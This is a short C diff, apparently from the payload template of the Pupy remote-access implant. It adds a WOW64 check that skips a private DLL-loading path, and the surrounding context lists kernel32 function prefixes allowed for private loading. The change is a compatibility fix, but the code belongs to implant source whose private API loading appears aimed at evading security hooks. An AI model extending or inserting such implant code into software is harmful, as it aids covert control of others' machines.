@@ -166,6 +166,30 @@ static const PSTR Kernel32AllowedPrefixes[] = {
     "Write", "Read", "Terminate", "Resume", "Virtual",
     "Reg", NULL
 };
+
+typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
+LPFN_ISWOW64PROCESS fnIsWow64Process;
+
+BOOL IsWow64()
+{
+#ifdef WIN_X86
+    BOOL bIsWow64 = TRUE;
+
+    //IsWow64Process is not available on all supported versions of Windows.
+    //Use GetModuleHandle to get a handle to the DLL that contains the function
+    //and GetProcAddress to get a pointer to the function if available.
+
+    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
+        GetModuleHandle("kernel32"),"IsWow64Process");
+
+    if(NULL != fnIsWow64Process)
+        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
+
+    return bIsWow64;
+#else
+    return FALSE;
+#endif
+}
 #endif
 
 void initialize(BOOL isDll, on_exit_session_t *cb) {
@@ -185,9 +209,13 @@ void initialize(BOOL isDll, on_exit_session_t *cb) {
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 #ifdef _PUPY_PRIVATE_NT
-    hNtDll = GetModuleHandleA("NTDLL.DLL");
-    hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
-    hKernel32 = GetModuleHandleA("KERNEL32.DLL");
+    if (IsWow64()) {
+        dprint("WOW64 + _PUPY_PRIVATE_NT known to be broken right now\n");
+    } else {
+        hNtDll = GetModuleHandleA("NTDLL.DLL");
+        hKernelBase = GetModuleHandleA("KERNELBASE.DLL");
+        hKernel32 = GetModuleHandleA("KERNEL32.DLL");
+    }
 
     if (hNtDll && hKernel32 && hKernelBase)  {
         HMODULE hPrivate;
